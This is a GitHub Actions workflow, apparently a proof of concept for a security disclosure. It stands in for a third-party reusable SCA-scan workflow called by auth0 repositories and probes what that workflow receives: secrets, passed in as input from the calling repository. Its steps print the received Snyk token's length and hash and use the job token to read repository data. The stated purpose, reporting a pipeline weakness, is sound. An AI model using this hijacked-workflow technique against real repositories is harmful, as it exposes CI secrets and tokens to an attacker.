# Demo stand-in for atko-security/devsecops-tooling/.github/workflows/sca-scan.yml
# Referenced by auth0 repos' sca_scan.yml as:
#   jobs:
#     snyk-cli:
#       uses: atko-security/devsecops-tooling/.github/workflows/sca-scan.yml@main
#       secrets:
#         SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
# In the PoC fork the owner prefix is swapped to the demo account; everything
# else is byte-identical. Harmless probes only, targeting the fork alone.
name: sca-scan (capability probe)

on:
  workflow_call:
    secrets:
      SNYK_TOKEN:
        required: false

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Prove execution in caller context and secret delivery
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        run: |
          echo "attacker-controlled reusable workflow executing inside: ${{ github.repository }}"
          echo "event: ${{ github.event_name }}  actor: ${{ github.actor }}  ref: ${{ github.ref }}"
          echo "SNYK_TOKEN length received by callee: ${#SNYK_TOKEN}"
          printf 'sha256(SNYK_TOKEN) received by callee: '
          printf %s "$SNYK_TOKEN" | sha256sum | cut -d' ' -f1
          echo "(GitHub masks the secret's literal value in logs; this hash lets"
          echo " anyone verify delivery against the published sentinel hash)"

      - name: Prove job token availability in the callee
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          echo "github.token available to callee: ${#GH_TOKEN} chars"
          gh api "repos/${{ github.repository }}" --jq '"callee can read " + .full_name + " with the auto-granted token"'
